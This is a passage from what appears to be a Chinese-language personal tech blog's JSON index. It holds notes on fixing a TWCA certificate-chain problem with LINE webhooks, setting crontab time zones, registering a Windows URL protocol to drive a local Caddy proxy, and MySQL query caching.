SNI<br>讓我想到之前驗證環境的問題<br><a href=\"https://malagege.github.io/blog/2020/06/25/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/\">Java 因憑證 SNI 問題驗證不過 | 程式狂想筆記</a><br>原來 Apache 做的設定，對應 LB(負載平衡)機器也要做這些設定<br>但遺憾還是沒有解決問題</p>\n<h3 id=\"根憑證是否為裝置-Client-認證\"><a href=\"#根憑證是否為裝置-Client-認證\" class=\"headerlink\" title=\"根憑證是否為裝置(Client)認證\"></a>根憑證是否為裝置(Client)認證</h3><p>前面第一點已經據透了<br>我們發現驗證環境的萬用憑證可以跑<br>但是正式環境驗證憑證不可以跑</p>\n<p>原來公司舊有憑證是四層(TWCA)<br>但是新憑證是三層(TWCA)<br>這2種都是合法憑證</p>\n<img src=\"/blog/2020/07/14/設備根憑證不正確導致不能打API問題/l4.png\" title=\"四層\">\n<img src=\"/blog/2020/07/14/設備根憑證不正確導致不能打API問題/l3.png\" title=\"三層\">\n<p>從憑證路徑可以看到一個三層，一個四層<br>但偏偏 LINE ROOT CA 只有<code>CN=TWCA Root Certification Authority, OU=Root CA, O=TAIWAN-CA, C=TW</code><br>沒有 TWCA ROOT CA</p>\n<p>公司剛好因為換新憑證都改用三層<br>所以會有這個問題…</p>\n<p>所以中繼憑證改成四層就沒這個問題</p>\n<ol>\n<li>完美成果</li>\n</ol>\n<img src=\"/blog/2020/07/14/設備根憑證不正確導致不能打API問題/cgh.png\">\n<img src=\"/blog/2020/07/14/設備根憑證不正確導致不能打API問題/cgh2.png\" width=\"2\">\n<ol start=\"2\">\n<li>root ca 包在中繼憑證，順序錯誤</li>\n</ol>\n<img src=\"/blog/2020/07/14/設備根憑證不正確導致不能打API問題/eci.png\">\n<img src=\"/blog/2020/07/14/設備根憑證不正確導致不能打API問題/eci2.png\">\n<ol start=\"3\">\n<li>root ca 包在中繼憑證+中繼憑證順序錯誤</li>\n</ol>\n<img src=\"/blog/2020/07/14/設備根憑證不正確導致不能打API問題/linewebhook.png\">\n<img src=\"/blog/2020/07/14/設備根憑證不正確導致不能打API問題/linewebhook2.png\">\n<p>我的建議憑證包四層比較不會出問題<br>因為第二層憑證是一樣的<br>第三層的話，Root CA 就會抓到白名單</p>\n<p>假如四層的話，中繼串到第三個後面，就是白名單<br>不過 TWCA 說最新發的都是三層??<del>這原因我就沒深入追查</del><br><a href=\"https://malagege.github.io/blog/2020/07/18/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/#TWCA-%E6%86%91%E8%AD%89%E7%82%BA%E4%BB%80%E9%BA%BC%E6%9C%89%E4%B8%89%E5%B1%A4%EF%BC%8C%E5%9B%9B%E5%B1%A4%E4%B8%B2%E5%88%B0%E5%90%8C%E4%B8%80%E5%80%8B%E6%86%91%E8%AD%89%E5%91%A2\">產生自簽憑證筆記 | TWCA 憑證為什麼有三層，四層串到同一個憑證呢?</a><br>我猜應該相同名字會抓出來比較<br>剛好兩張私鑰都是一樣的</p>\n<p>題外話，這邊我發現有趣現象<br>用 Firefox 是三層(沒有看到四層)，Chrome(IE,Window)是四層<br>不知道是不是憑證是用 名稱去找的 <del><strong>這個是我猜的，目前沒有找到資訊</strong></del></p>\n<blockquote>\n<p>憑證簽發者(ISSUER)的名稱與憑證主體(Subject Name)名稱相同!<br>參考:<a href=\"https://www.sslbuyer.com/index.php?option=com_content&amp;view=article&amp;id=183:what-is-certificate-chain&amp;catid=25&amp;Itemid=4031\" target=\"_blank\" rel=\"noopener\">憑證串鍊的解釋 - SSL憑證推薦網 | SSL憑證 | code Sign</a><br>難道真的是看名字??<br>Android也是三層<br>剛好有抓到 TWCA Root CA 根憑證所以才三層<br>至於怎麼抓的就不研究了</p>\n</blockquote>\n<p>現在回想<a href=\"https://malagege.github.io/blog/2018/10/10/%E8%90%AC%E7%94%A8%E6%86%91%E8%AD%89-WildCard-%E5%92%8C%E4%B8%AD%E9%96%93%E6%86%91%E8%AD%89%E5%B0%8F%E8%A8%98/\">萬用憑證(WildCard)和中間憑證小記 | 程式狂想筆記</a><br>是不是沒有串到根憑證??現在也查不到了</p>\n<h3 id=\"檢查-Chipser\"><a href=\"#檢查-Chipser\" class=\"headerlink\" title=\"檢查 Chipser\"></a>檢查 Chipser</h3><ul>\n<li><p><a href=\"https://medium.com/@clu1022/%E9%82%A3%E4%BA%9B%E9%97%9C%E6%96%BCssl-tls%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B-%E4%B9%9D-ssl-communication-31a2a8a888a6\" target=\"_blank\" rel=\"noopener\">那些關於SSL/TLS的二三事(九) — SSL (HTTPS)Communication | by Carl | Medium</a></p>\n</li>\n<li><p><a href=\"https://www.brilliantcode.net/1229/apache-advance-settings-tlsv1-2-tlsv1-1-sslv3/\" target=\"_blank\" rel=\"noopener\">Apache進階設定(1) - TLSv1.2 TLSv1.1 SSLv2 SSLv3 - BrilliantCode.net</a></p>\n</li>\n</ul>\n<p>之前有聽說可以不戴加密做 TLS<br>有看到這個關鍵字 null cipher suites<br>不知道是不是指這個?<br>我就不詳細研究了</p>\n<h2 id=\"名詞整理\"><a href=\"#名詞整理\" class=\"headerlink\" title=\"名詞整理\"></a>名詞整理</h2><h3 id=\"根憑證\"><a href=\"#根憑證\" class=\"headerlink\" title=\"根憑證\"></a>根憑證</h3><blockquote>\n<p>Self-Signed CA<br>亦可稱為 root CA。由於此種 CA 所發的憑證(certificate)是不經由任何上層 CA 所認證，而是以「自行認證」的方式進行認證。因此像是最上層的商業 CA，或是自行架設內部認證用的 CA，都可以屬於此類。<br>參考來源: <a href=\"https://mistech.pixnet.net/blog/post/80751019-certificate-authority%28ca%29-%E6%86%91%E8%AD%89%E7%B0%A1%E4%BB%8B\" target=\"_blank\" rel=\"noopener\">Certificate Authority(CA) 憑證簡介 @ MISTECH 技術手抄本 :: 痞客邦 ::</a></p>\n</blockquote>\n<p>簡單來說就是根憑證，一開始你的電腦微軟附的作業系統裡面，有裝一些憑證，隨著系統更新，這些憑證都會update。<br>根憑證因為沒有上層，所以你電腦有根憑證白名單，就會算是合法的憑證。</p>\n<h3 id=\"中繼憑證\"><a href=\"#中繼憑證\" class=\"headerlink\" title=\"中繼憑證\"></a>中繼憑證</h3><img src=\"/blog/2020/07/14/設備根憑證不正確導致不能打API問題/chain.png\" title=\"title\">\n<p>參考來源:<a href=\"https://medium.com/@clu1022/%E9%82%A3%E4%BA%9B%E9%97%9C%E6%96%BCssl-tls%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B-%E5%8D%81%E4%BA%8C-chain-of-trust-f00da1f2cc15\" target=\"_blank\" rel=\"noopener\">那些關於SSL/TLS的二三事(十二) — Chain of Trust | by Carl | Medium</a><br>這篇說得很清楚，但我也只是略懂略懂<br>一直在想為什麼會有中繼憑證，缺少中繼憑證會發生什麼事?順序錯會發生什麼事?<br>當前憑證並非是 Root CA 認證而是靠中繼憑證…<br>中繼憑證會再往上根 Root Ca 驗證<br>到白名單就是安全性任憑正</p>\n<h3 id=\"憑證加密過程\"><a href=\"#憑證加密過程\" class=\"headerlink\" title=\"憑證加密過程\"></a>憑證加密過程</h3><p><img src=\"https://upload.wikimedia.org/wikipedia/commons/thumb/6/65/PublicKeyCertificateDiagram_It.svg/langzh-1100px-PublicKeyCertificateDiagram_It.svg.png\" alt=\"\"></p>\n<p>簡單說就是 <code>公鑰</code> + <code>上層憑證私鑰</code> = 憑證<br>這張憑證就會給你設定 Apache 上<br>驗證憑證會跟上層憑證公鑰解開加密確認值<br>一致就確認沒問題，繼續往上面憑證追查，直到 Root CA</p>\n<h3 id=\"整理憑證鍊遇到問題\"><a href=\"#整理憑證鍊遇到問題\" class=\"headerlink\" title=\"整理憑證鍊遇到問題\"></a>整理憑證鍊遇到問題</h3><h4 id=\"Contains-anchors\"><a href=\"#Contains-anchors\" class=\"headerlink\" title=\"Contains anchors\"></a>Contains anchors</h4><p>包到主憑證，之前有看過文章中繼憑證不需要包 root ca</p>\n<p><a href=\"https://qualys-secure.force.com/discussions/s/question/0D52L00004TnvJ5SAJ/chain-issues-contains-anchors\" target=\"_blank\" rel=\"noopener\">Chain issues: Contains anchors</a><br><a href=\"https://qualys-secure.force.com/discussions/s/question/0D52L00004TnyFQSAZ/trouble-with-intermediate-certificate-chain-issues-incomplete\" target=\"_blank\" rel=\"noopener\">Trouble with intermediate certificate “Chain Issues: Incomplete”</a></p>\n<h4 id=\"Extra-download\"><a href=\"#Extra-download\" class=\"headerlink\" title=\"Extra download\"></a>Extra download</h4><p>好像就是中繼憑證跟給予憑證沒包在一起樣子?<br>我沒有實驗，像 nginx 就沒有中繼憑證設定<br>不是很確定原因</p>\n<p><a href=\"https://qualys-secure.force.com/discussions/s/question/0D52L00004TnuTuSAJ/how-to-fix-extra-download\" target=\"_blank\" rel=\"noopener\">How to fix “Extra download”</a><br><a href=\"https://qualys-secure.force.com/discussions/s/question/0D52L00004TnuRQSAZ/multiple-certification-paths\" target=\"_blank\" rel=\"noopener\">Multiple Certification Paths</a><br><a href=\"https://www.ssl.com.tw/Down/\" target=\"_blank\" rel=\"noopener\">https://www.ssl.com.tw/Down/</a></p>\n<h3 id=\"下載憑證方法-無法看到中繼憑證\"><a href=\"#下載憑證方法-無法看到中繼憑證\" class=\"headerlink\" title=\"下載憑證方法(無法看到中繼憑證)\"></a>下載憑證方法(無法看到中繼憑證)</h3><p><a href=\"https://www.shellhacks.com/get-ssl-certificate-from-server-site-url-export-download/\" target=\"_blank\" rel=\"noopener\">Get SSL Certificate from Server (Site URL) - Export &amp; Download - ShellHacks</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 下載憑證 (不包含中繼)</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> | openssl s_client -servername NAME -connect HOST:PORT |\\</span><br><span class=\"line\">  sed -ne <span class=\"string\">'/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p'</span> &gt; certificate.crt</span><br><span class=\"line\"><span class=\"comment\"># 查看中繼憑證 (-A 數字可以大一點)</span></span><br><span class=\"line\"> <span class=\"built_in\">echo</span> <span class=\"string\">\"\"</span>|openssl s_client -connect www.cgh.org.tw:443 2&gt;&amp;1 | grep -A 9 <span class=\"string\">\"Certificate chain\"</span></span><br></pre></td></tr></table></figure>\n<p>其實之前就有做過類似筆記:<a href=\"https://malagege.github.io/blog/2020/05/30/Linux-%E6%8C%87%E4%BB%A4%E7%A2%BA%E8%AA%8DSSL%E6%86%91%E8%AD%89/\">Linux 指令確認SSL憑證 | 程式狂想筆記</a></p>\n<h3 id=\"格式轉換\"><a href=\"#格式轉換\" class=\"headerlink\" title=\"格式轉換\"></a>格式轉換</h3><p><a href=\"https://ssorc.tw/7142/openssl-%E6%8C%87%E4%BB%A4-command-line-%E8%BD%89%E6%AA%94-pem-der-p7b-pfx-cer/\" target=\"_blank\" rel=\"noopener\">openssl 指令 command line - 轉檔 pem/der/p7b/pfx/cer | SSORC.tw</a></p>\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><p>安裝中繼憑證</p>\n<ul>\n<li><a href=\"http://yy-programer.blogspot.com/2019/02/gcacertificate-chain.html\" target=\"_blank\" rel=\"noopener\">Yy’s Program: GCA政府憑證串鍊(Certificate chain)問題</a></li>\n</ul>\n<p>see chain </p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/18733383/show-entire-certificate-chain-for-a-local-certificate-file\" target=\"_blank\" rel=\"noopener\">ssl - show entire certificate chain for a local certificate file - Stack Overflow</a></li>\n<li><a href=\"https://kdecherf.com/blog/2015/04/10/show-the-certificate-chain-of-a-local-x509-file/\" target=\"_blank\" rel=\"noopener\">Show the certificate chain of a local X509 file - kdecherf ~ %</a><br>這邊是做憑證驗證</li>\n</ul>\n<p>憑證教學</p>\n<ul>\n<li><p><a href=\"https://blog.xuite.net/towns/hc/556816027-SSL+%E6%86%91%E8%AD%89%E7%94%B3%E8%AB%8B%E3%80%81%E5%8F%96%E5%BE%97%E5%8F%8A%E5%AE%89%E8%A3%9D\" target=\"_blank\" rel=\"noopener\">SSL 憑證申請、取得及安裝 @ 來吧~~~電腦 :: 隨意窩 Xuite日誌</a></p>\n</li>\n<li><p><a href=\"http://www.alvinchen.club/2018/09/27/apache-nginx%E4%B8%8A%E5%AE%89%E8%A3%9D-twca%E6%86%91%E8%AD%89/\" target=\"_blank\" rel=\"noopener\">Apache Nginx上安裝 TWCA憑證 - Alvin Chen Club</a></p>\n</li>\n<li><p><a href=\"https://ssl-config.mozilla.org/#server=apache&amp;version=2.4.41&amp;config=intermediate&amp;openssl=1.1.1d&amp;guideline=5.4\" target=\"_blank\" rel=\"noopener\">Mozilla SSL Configuration Generator</a><br>之後相關 Apache, Redis, Mysql  TLS 加密可以看這邊設定</p>\n</li>\n</ul>\n<h2 id=\"小記\"><a href=\"#小記\" class=\"headerlink\" title=\"小記\"></a>小記</h2><p>原本這個問題沒有頭緒，line webhook 後臺可以打得到AP<br>但是用手機 LINE APP 操作就抓不到<br>有用防火牆看到 Server Action RST<br>正常Action:Session close<br>後來用公司 Load Balancer 作風包解析(tcpdump)<br>發現這一塊 https 三項交握有問題</p>\n<p>看了這篇除了驗證憑證，那註銷後的憑證要怎麼確認<br>Google 一下找到 CRL(<a href=\"http://ijecorp.blogspot.com/2016/01/ocsp-crl.html\" target=\"_blank\" rel=\"noopener\">寫程式是良心事業: OCSP &amp; CRL 介紹</a>)<br>這邊就不先繼續研究了</p>\n<p>我覺得之後可以手動做做看</p>\n<p><del>TODO: 之後可能照保哥做做看自簽名憑證</del><br><a href=\"https://malagege.github.io/blog/2020/07/18/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/\">產生自簽憑證筆記 | 程式狂想筆記</a><br>完成測試</p>\n<p>這篇算是我的筆記，也許會有很多寫錯，建議大家還是看看大神寫文章!!<br><a href=\"https://blog.miniasp.com/post/2010/03/02/The-Complete-Guide-for-Purchase-Install-SSL-Certificate-to-IIS7\" target=\"_blank\" rel=\"noopener\">購買與安裝 SSL 憑證完全攻略（以 IIS7 為例） | The Will Will Web</a><br><a href=\"https://blog.miniasp.com/post/2019/02/25/Creating-Self-signed-Certificate-using-OpenSSL?fbclid=IwAR3xS1xqkOfLQmK22bDyp9bgOJ71PBNChr-2REMq3oIMT5-0biUTJl41a1k\" target=\"_blank\" rel=\"noopener\">如何使用 OpenSSL 建立開發測試用途的自簽憑證 (Self-Signed Certificate) | The Will Will Web</a><br><a href=\"https://blog.miniasp.com/post/2013/01/09/The-Complete-Guide-Free-StartSSL-personal-and-web-site-ssl-tls-certificates\" target=\"_blank\" rel=\"noopener\">免費申請 StartSSL™ 個人數位簽章與網站 SSL 憑證完全攻略 | The Will Will Web</a></p>\n","categories":["Linux"],"tags":["tls","憑證"]},{"title":"設定crontab排程時區小記","url":"/blog/2019/05/16/%E8%A8%AD%E5%AE%9Acrontab%E6%8E%92%E7%A8%8B%E6%99%82%E5%8D%80%E5%B0%8F%E8%A8%98/","content":"<p>最近因為要設定 crontab 時區<br>但主機時區不是台灣時間<br>但程式是台灣時間<br>但這時候控制排程可能就會有時間差的問題</p>\n<a id=\"more\"></a>\n<h2 id=\"在-Linux-設定-方法\"><a href=\"#在-Linux-設定-方法\" class=\"headerlink\" title=\"在 Linux 設定 方法\"></a>在 Linux 設定 方法</h2><p>其實這時候很簡單，調整時區就能解決問題!!</p>\n<p>Crontab 能不能調整時區?<br>答案可以：<br><a href=\"https://menyifan.com/2016/11/08/crontab_timezone/\" target=\"_blank\" rel=\"noopener\">CentOS7 下 Crontab 时区问题 | MYF</a></p>\n<blockquote>\n<p>ntpdate -u tock.stdtime.gov.tw<br>timedatectl set-timezone Asia/Taipei<br>timedatectl set-local-rtc 0 # Set Real-Time Clock<br>cp -pf /usr/share/zoneinfo/Asia/Taipei /etc/localtime</p>\n</blockquote>\n<p>其他相關<br><a href=\"https://blog.gtwang.org/linux/linux-ntp-installation-and-configuration-tutorial/\" target=\"_blank\" rel=\"noopener\">Linux 設定 NTP 同步系統時間，自動網路校時教學 - G. T. Wang</a><br><a href=\"https://szlin.me/2016/07/19/%E4%BD%BF%E7%94%A8-ntpd-%E4%BE%86%E6%9B%BF%E6%8F%9B-ntpdate-%E4%BB%A5%E5%AE%8C%E6%88%90%E6%A0%A1%E6%99%82%E7%9A%84%E5%B7%A5%E4%BD%9C/\" target=\"_blank\" rel=\"noopener\">使用 ntpd 來替換 ntpdate 以完成校時的工作 – SZ Lin &amp; Embedded Linux</a></p>\n<p>可惜！目前專案不太希望我們動到主機時區 orz</p>\n<h2 id=\"設定-bash-環境變數\"><a href=\"#設定-bash-環境變數\" class=\"headerlink\" title=\"設定 bash 環境變數\"></a>設定 bash 環境變數</h2><blockquote>\n<p>TZ=’Asia/Taipei’; export TZ</p>\n</blockquote>\n<p><a href=\"http://luosiyong.lofter.com/post/1cc7f64b_6cc5cfc\" target=\"_blank\" rel=\"noopener\">crontab 时区以及 linux 时区设置-luosiyong</a></p>\n<p>這可以改變 Bash 變時區問題<br>但是 Crontab 還是不會有影響<br><a href=\"https://busy.org/@oflyhigh/cron#comments\" target=\"_blank\" rel=\"noopener\">定时任务 cron 时区的问题</a> <a href=\"/blog/2019/05/16/設定crontab排程時區小記/1.png\" title=\"備份圖\">備份圖</a></p>\n<p><code>/etc/init.d/cron</code>但這邊設定檔好像可以設定</p>\n<p><strong>PS:還沒有驗證</strong></p>\n<p><a href=\"https://www.tecmint.com/online-cron-job-generator-and-tester-for-linux/\" target=\"_blank\" rel=\"noopener\">6 Online Tools for Generating and Testing Cron Jobs for Linux</a></p>\n<p>其實，PHP CI 的 index.php 連線都有設定台灣時區，DB 連線也有設定<br>但之後程式可能需要有程式設定 crontab<br>目前有想到用程式減少相對時區<br>解決問題</p>\n<p>小記 Laravel 設定時區<a href=\"http://phpwrite.blogspot.com/2015/08/laravel-5-timezone.html\" target=\"_blank\" rel=\"noopener\">PHPer: Laravel 5 資料庫 timezone 設定</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&apos;mysql&apos; =&gt; [</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    &apos;options&apos; =&gt; [</span><br><span class=\"line\">        PDO::MYSQL_ATTR_INIT_COMMAND =&gt; &apos;SET time_zone = &quot;+08:00&quot;&apos;</span><br><span class=\"line\">    ],</span><br><span class=\"line\">    (or)</span><br><span class=\"line\">    &apos;timezone&apos; =&gt; &apos;+08:00&apos;,</span><br><span class=\"line\">],</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://laravel.io/forum/10-16-2015-set-default-mysql-timezone-on-connect\" target=\"_blank\" rel=\"noopener\">Set default MySQL timezone on connect? | Laravel.io</a><br><a href=\"https://askubuntu.com/questions/54364/how-do-you-set-the-timezone-for-crontab\" target=\"_blank\" rel=\"noopener\">cron - How do you set the timezone for crontab? - Ask Ubuntu</a></p>\n"},{"title":"Windows 註冊瀏覽器協定方法","url":"/blog/2019/11/06/%E8%A8%BB%E5%86%8A%E7%80%8F%E8%A6%BD%E5%99%A8%E5%8D%94%E5%AE%9A%E6%96%B9%E6%B3%95/","content":"<p>最近要使用瀏覽器套件 暴力猴 操作一些程式<br>一直再想有什麼可以執行 bash 方法<br>最後有找到一篇 window 註冊協定</p>\n<a id=\"more\"></a>\n<p>找到這篇<a href=\"http://kb.mozillazine.org/Register_protocol\" target=\"_blank\" rel=\"noopener\">Register protocol - MozillaZine Knowledge Base</a><br>簡單設定登錄檔就能解決</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">REGEDIT4</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\foo]</span><br><span class=\"line\">@=&quot;URL:foo Protocol&quot;</span><br><span class=\"line\">&quot;URL Protocol&quot;=&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\foo\\shell]</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\foo\\shell\\open]</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\foo\\shell\\open\\command]</span><br><span class=\"line\">@=&quot;\\&quot;C:\\\\Program Files\\\\Application\\\\program.exe\\&quot; \\&quot;%1\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<p>就這麼簡單，這邊的 %1 是 url 代的網址，後面都會加<code>/</code>( 我是用 Firefox，Chrome不確定 )</p>\n<h2 id=\"番外小記\"><a href=\"#番外小記\" class=\"headerlink\" title=\"番外小記\"></a>番外小記</h2><p>跟本篇沒有關係<br>其實我呼就出我的 sh<br>做開啟反向代理<br>但還是失敗了…</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /d/</span><br><span class=\"line\"><span class=\"comment\"># pwd</span></span><br><span class=\"line\"><span class=\"comment\"># ./caddy2.exe stop</span></span><br><span class=\"line\"><span class=\"comment\"># ./caddy2.exe start --config caddyfile.json</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># curl -X PATCH \\</span></span><br><span class=\"line\"><span class=\"comment\">#   http://localhost:2019/config/apps/http/servers/proxy/routes/0/handle/0/headers/request/set/Cookie/0 \\</span></span><br><span class=\"line\"><span class=\"comment\">#   -H 'Content-Type: application/json' \\</span></span><br><span class=\"line\"><span class=\"comment\">#   -H 'cache-control: no-cache' \\</span></span><br><span class=\"line\"><span class=\"comment\">#   -d \"\\\"$&#123;1:12:-1&#125;\\\"\"</span></span><br><span class=\"line\">sed -i -E <span class=\"string\">\"s/header_upstream Cookie \\\".+\\\"/header_upstream Cookie \\\"<span class=\"variable\">$&#123;1:12:-1&#125;</span>\\\"/\"</span> Caddyfile</span><br><span class=\"line\">ps aux | grep caddy | awk <span class=\"string\">'&#123;print $1&#125;'</span> | xargs <span class=\"built_in\">kill</span> -9</span><br><span class=\"line\">./caddy</span><br></pre></td></tr></table></figure>\n<p>caddy2 不知道要怎麼調整到反向代理到 https<br>但是 caddy1 竟然可以輕鬆調整</p>\n<p>caddy2 好處可以用 api 方式去調整設定 Server<br>但是用瀏覽器做 AJAX caddy2 admin api 調整竟然會有 OPTIONS 過不去…<br>最後想到用 sh 呼叫執行<br>發現 caddy2 <del>不能</del>不會調整反向代理到 https<br>只能摸摸鼻子用 caddy1</p>\n<p>最後還是大失敗<br>那個網站 Cookie 竟然是用 httponly<br>這個是讓你沒辦法用 JS 控制有設定 httponly 的 Cookies (<a href=\"https://zhuanlan.zhihu.com/p/36197012\" target=\"_blank\" rel=\"noopener\">浅谈Js 操作Cookie，以及HttpOnly 的限制 - 知乎</a>)<br>所以終究大失敗 QQ</p>\n<p>其實 Cookie httponly 感覺已可以寫一篇記錄<br>因為還發現 Cookie 也可以針對 Path 去做發送 指定Cookie<br>一直以為 Cookie 不是很安全，但 httponly 真的還滿安全</p>\n<p>Caddyfile<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">localhost:8881</span><br><span class=\"line\">gzip</span><br><span class=\"line\">log test.log</span><br><span class=\"line\"></span><br><span class=\"line\">proxy / https://xxxxx/ &#123;</span><br><span class=\"line\">websocket</span><br><span class=\"line\">header_upstream -Referern</span><br><span class=\"line\">header_upstream -Server</span><br><span class=\"line\">header_upstream Cookie &quot;test=1572361464;a=xxx&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>caddyfile.json<br><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"apps\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"http\"</span>: &#123;</span><br><span class=\"line\">      <span class=\"attr\">\"servers\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"proxy\"</span>: &#123;</span><br><span class=\"line\">          <span class=\"attr\">\"listen\"</span>: [</span><br><span class=\"line\">            <span class=\"string\">\":888\"</span></span><br><span class=\"line\">          ],</span><br><span class=\"line\">          <span class=\"attr\">\"routes\"</span>: [</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"attr\">\"handle\"</span>: [</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  <span class=\"attr\">\"handler\"</span>: <span class=\"string\">\"reverse_proxy\"</span>,</span><br><span class=\"line\">                  <span class=\"attr\">\"headers\"</span>: &#123;</span><br><span class=\"line\">                    <span class=\"attr\">\"request\"</span>: &#123;</span><br><span class=\"line\">                      <span class=\"attr\">\"set\"</span>: &#123;</span><br><span class=\"line\">                        <span class=\"attr\">\"Host\"</span>: [</span><br><span class=\"line\">                          <span class=\"string\">\"&#123;http.handlers.reverse_proxy.upstream.host&#125;\"</span></span><br><span class=\"line\">                        ],</span><br><span class=\"line\">                        <span class=\"attr\">\"delete\"</span>: [</span><br><span class=\"line\">                          <span class=\"string\">\"Referern\"</span>,</span><br><span class=\"line\">                          <span class=\"string\">\"Server\"</span></span><br><span class=\"line\">                        ],</span><br><span class=\"line\">                        <span class=\"attr\">\"Cookie\"</span>: [</span><br><span class=\"line\">                          <span class=\"string\">\"test=test\"</span></span><br><span class=\"line\">                        ]</span><br><span class=\"line\">                      &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                  &#125;,</span><br><span class=\"line\">                  <span class=\"attr\">\"transport\"</span>: &#123;</span><br><span class=\"line\">                    <span class=\"attr\">\"protocol\"</span>: <span class=\"string\">\"tls\"</span></span><br><span class=\"line\">                  &#125;,</span><br><span class=\"line\">                  <span class=\"attr\">\"upstreams\"</span>: [</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                      <span class=\"attr\">\"dial\"</span>: <span class=\"string\">\"localhost:519\"</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                  ]</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">              ],</span><br><span class=\"line\">              <span class=\"attr\">\"match\"</span>: [</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  <span class=\"attr\">\"host\"</span>: [</span><br><span class=\"line\">                    <span class=\"string\">\"localhost\"</span></span><br><span class=\"line\">                  ]</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">              ]</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          ]</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>REG<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">REGEDIT4</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\caddycurl]</span><br><span class=\"line\">@=&quot;URL:caddycurl Protocol&quot;</span><br><span class=\"line\">&quot;URL Protocol&quot;=&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\caddycurl\\shell]</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\caddycurl\\shell\\open]</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\caddycurl\\shell\\open\\command]</span><br><span class=\"line\">@=&quot;\\&quot;C:\\\\Program Files\\\\Git\\\\git-bash.exe\\&quot; \\&quot;/d/caddycurl.sh\\&quot; \\&quot;%1\\&quot;&quot;</span><br></pre></td></tr></table></figure></p>\n<p>番外中的番外 小記<br><a href=\"https://blog.51cto.com/13544424/2149473\" target=\"_blank\" rel=\"noopener\">python3.7安装后ssl问题-苏黎世1995的博客-51CTO博客</a><br><a href=\"https://www.cnblogs.com/mqxs/p/9103031.html\" target=\"_blank\" rel=\"noopener\">【Python】CentOs7 Python3安装Openssl以及解决ssl问题 - 梦琪小生 - 博客园</a></p>\n","categories":["Web"],"tags":["Web"]},{"title":"調教MYSQL效能，SQL_NO_CACHE不讀取緩存","url":"/blog/2018/05/17/%E8%AA%BF%E6%95%99MYSQL%E6%95%88%E8%83%BD%EF%BC%8CSQL-NO-CACHE%E4%B8%8D%E8%AE%80%E5%8F%96%E7%B7%A9%E5%AD%98/","content":"<p>最近在專案使用phpmyadmin測試sql的時候<br>發現第一次執行需要3秒的時間<br>第二次是0.3秒的時間<br>但是…我不可能一直的等很久再做Query動作<br>後來有在網路上看到在 <em>select</em> 後面插入SQL_NO_CACHE<br>可以解決這個問題</p>\n<ul>\n<li><a href=\"http://www.itpub.net/thread-1755321-2-1.html\" target=\"_blank\" rel=\"noopener\">Mysql 简单SELECT，第一次很慢，以后很快，这是什么问题 - 第2页 - MySQL及其它开源数据库 - ITPUB论坛－中国最专业的IT技术社区</a></li>\n<li><a href=\"https://kknews.cc/zh-tw/other/aenlgex.html\" target=\"_blank\" rel=\"noopener\">你真的會用mysql 的SQL_NO_CACHE嗎？ - 每日頭條</a></li>\n</ul>\n","categories":["MySQL"],"tags":["sql","MySQL"]},{"title":"從MySQL裡面直接(select)讀取出文件設計書表格格式","url":"/blog/2019/01/19/%E8%AE%80%E5%8F%96%E5%87%BA%E6%96%87%E4%BB%B6%E8%A8%AD%E8%A8%88%E6%9B%B8%E8%A1%A8%E6%A0%BC%E6%A0%BC%E5%BC%8F/","content":"<p>最近公司創建 MySQL 需要寫文件<br>但是通常我們開工單都是在開發環境建立 MySQL<br>手動建立 Table 產生 SQL 